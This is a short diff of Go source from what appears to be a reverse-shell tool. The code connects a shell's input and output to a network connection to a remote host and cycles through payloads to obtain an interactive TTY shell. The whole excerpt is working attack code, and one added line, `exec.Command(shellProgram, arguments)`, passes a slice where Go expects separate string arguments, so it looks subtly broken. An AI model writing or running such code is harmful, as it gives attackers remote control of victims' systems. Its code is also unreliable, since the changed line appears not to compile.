@@ -36,7 +36,7 @@ func reverseShell(host string, port string) {
 
 func spawnShell(connexion net.Conn, shellProgram string, arguments ...string) {
 	connexion.Write([]byte("[+] Shell spawned.\n[!] Please type \"exit\" to exit the shell or the process will freeze server-side.\n"))
-	shell := exec.Command(shellProgram)
+	shell := exec.Command(shellProgram, arguments)
 	shell.Stdout, shell.Stderr, shell.Stdin = connexion, connexion, connexion
 	shell.Run()
 }
@@ -44,8 +44,7 @@ func spawnShell(connexion net.Conn, shellProgram string, arguments ...string) {
 func findPTYShell(connexion net.Conn, payloadList map[int]string, shellProgram string) {
 	connexion.Write([]byte("[+] Trying payloads...\n"))
 	for _, payload := range payloadList {
-		tryPayload := exec.Command(shellProgram, payload)
-		err := tryPayload.Run()
+		err := exec.Command(shellProgram, payload).Run()
 		if err == nil {
 			connexion.Write([]byte("[+] Payload worked ! Spawning TTY shell.\n"))
 			spawnShell(connexion, shellProgram, payload)
